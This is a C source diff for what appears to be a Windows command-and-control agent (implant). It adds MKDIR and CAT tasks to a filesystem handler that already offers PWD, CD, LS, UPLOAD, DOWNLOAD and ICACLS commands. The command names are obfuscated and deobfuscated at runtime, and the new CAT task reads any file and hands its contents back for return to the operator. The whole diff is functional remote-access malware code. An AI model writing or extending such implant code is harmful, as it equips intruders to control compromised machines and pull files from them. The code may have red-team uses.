@@ -78,6 +78,18 @@ BOOL IsTaskForFilesystem(LPVOID pTask)
         STRING_AGENT_CAP_ICACLS_FILE_LEN,
         strAgentCapIcaclsFile);
 
+    static CHAR strAgentCapMkdir[STRING_AGENT_CAP_MKDIR_LEN + 1] = ""; // "MKDIR"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_AGENT_CAP_MKDIR,
+        STRING_AGENT_CAP_MKDIR_LEN,
+        strAgentCapMkdir);
+
+    static CHAR strAgentCapCat[STRING_AGENT_CAP_CAT_LEN + 1] = ""; // "CAT"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_AGENT_CAP_CAT,
+        STRING_AGENT_CAP_CAT_LEN,
+        strAgentCapCat);
+
     return (
         CompareBuffer(pTask, strAgentCapPwd, STRING_AGENT_CAP_PWD_LEN) ||
         CompareBuffer(pTask, strAgentCapCd, STRING_AGENT_CAP_CD_LEN) ||
@@ -87,7 +99,9 @@ BOOL IsTaskForFilesystem(LPVOID pTask)
         CompareBuffer(pTask, strAgentCapLs, STRING_AGENT_CAP_LS_LEN) ||
         CompareBuffer(pTask, strAgentCapUpload, STRING_AGENT_CAP_UPLOAD_LEN) ||
         CompareBuffer(pTask, strAgentCapDownload, STRING_AGENT_CAP_DOWNLOAD_LEN) ||
-        CompareBuffer(pTask, strAgentCapIcaclsFile, STRING_AGENT_CAP_ICACLS_FILE_LEN));
+        CompareBuffer(pTask, strAgentCapIcaclsFile, STRING_AGENT_CAP_ICACLS_FILE_LEN) ||
+        CompareBuffer(pTask, strAgentCapMkdir, STRING_AGENT_CAP_MKDIR_LEN) ||
+        CompareBuffer(pTask, strAgentCapCat, STRING_AGENT_CAP_CAT_LEN));
 }
 
 /*
@@ -99,6 +113,11 @@ void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT P
 {
     if (pTask == NULL)
         return;
+
+    // Initialise output values
+    *pIsSuccess = FALSE;
+    *pResult = NULL;
+    *pResultSize = 0;
 
     // Prepare command strings
     static CHAR strAgentCapPwd[STRING_AGENT_CAP_PWD_LEN + 1] = ""; // "PWD"
@@ -155,8 +174,19 @@ void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT P
         STRING_AGENT_CAP_ICACLS_FILE_LEN,
         strAgentCapIcaclsFile);
 
+    static CHAR strAgentCapMkdir[STRING_AGENT_CAP_MKDIR_LEN + 1] = ""; // "MKDIR"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_AGENT_CAP_MKDIR,
+        STRING_AGENT_CAP_MKDIR_LEN,
+        strAgentCapMkdir);
+
+    static CHAR strAgentCapCat[STRING_AGENT_CAP_CAT_LEN + 1] = ""; // "CAT"
+    DeobfuscateUtf8String(
+        (PCHAR)STRING_AGENT_CAP_CAT,
+        STRING_AGENT_CAP_CAT_LEN,
+        strAgentCapCat);
+
     // Handle operations
-    *pResultSize = 0;
 
     //// Print working directory - PWD
     if (CompareBuffer(pTask, strAgentCapPwd, STRING_AGENT_CAP_PWD_LEN))
@@ -332,6 +362,37 @@ void HandleTaskFilesystem(IN WinApiCustom *pWinApiCustom, IN LPVOID pTask, OUT P
                 }
 
                 pWinApiCustom->HeapFreeCustom(pWhatToWrite);
+            }
+        }
+    }
+
+    //// Make directory - MKDIR DIR_NAME
+    else if (CompareBuffer(pTask, strAgentCapMkdir, STRING_AGENT_CAP_MKDIR_LEN))
+    {
+        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
+        {
+            *pIsSuccess = pWinApiCustom->loadedFunctions.CreateDirectoryA(
+                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
+                NULL);
+        }
+    }
+
+    //// Get file contents - CAT FILE_PATH
+    else if (CompareBuffer(pTask, strAgentCapCat, STRING_AGENT_CAP_CAT_LEN))
+    {
+        if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) == 2)
+        {
+            DWORD64 numOfBytesRead = 0;
+
+            LPVOID pFileContents = pWinApiCustom->ReadFileCustom(
+                NullSeparatedArrayStringAt((PCHAR)pTask, 1),
+                &numOfBytesRead);
+
+            if (pFileContents != NULL && numOfBytesRead != 0)
+            {
+                *pIsSuccess = TRUE;
+                *pResultSize = numOfBytesRead;
+                *pResult = pFileContents;
             }
         }
     }
